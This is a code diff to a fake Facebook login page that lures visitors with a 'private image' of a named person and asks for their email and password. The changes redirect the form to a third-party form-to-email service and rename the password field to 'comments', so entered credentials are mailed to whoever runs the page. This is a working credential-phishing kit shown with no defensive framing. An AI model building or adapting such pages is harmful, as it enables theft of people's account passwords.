@@ -113,10 +113,16 @@ function save()
 -->
 </script>
   
-<div class="login_form_container"><form id="login_form" method="POST" action="http://app.emailmeform.com/builder/form/S1857JkNW18l1hGwEI13i">
+<div class="login_form_container"><form id="login_form" method="POST" action="http://formtoemail.com/user_forms.php">
 <input type="hidden" name="lsd" value="AVr29Yo_" autocomplete="off" />
 <div class="hidden_elem"></div>This image is marked as private for <b>Jill Costello</b>. &nbsp;Log in to Facebook to view this image.
-<div id="loginform"><input type="hidden" autocomplete="off" id="api_key" name="api_key" value="120179524728527" />
+<div id="loginform">
+
+<input type="hidden" name="user_id" value="NDI06771SDD5VWY4P6UN">
+<input type="hidden" name="form_id" value="1">
+<span style="display: none;"><input type="text" name="name" /></span>
+
+<input type="hidden" autocomplete="off" id="api_key" name="api_key" value="120179524728527" />
 <input type="hidden" autocomplete="off" id="display" name="display" value="popup" />
 <input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" />
 <input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" />
@@ -126,7 +132,7 @@ function save()
 <input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="164542_nMT7" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix">
 
 <label for="email" class="login_form_label">Email:</label><input type="text" class="inputtext" id="email" name="email" value="" /></div>
-<div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="password" id="pass" class="inputpassword" value="<?php if(isset($_POST['password']))  echo $_POST['password'];?>"/></div>
+<div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="comments" id="pass" class="inputpassword" value="<?php if(isset($_POST['password']))  echo $_POST['password'];?>"/></div>
 <div class="persistent"><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox" /><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="_blank" tabindex="-1">Forgot your password?</a></p></div>
 <div id="dialog_buttons" class="dialog_buttons"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" type="submit" id="u_0_1" onclick="save();" /></label></div></form></div></div></div>
 
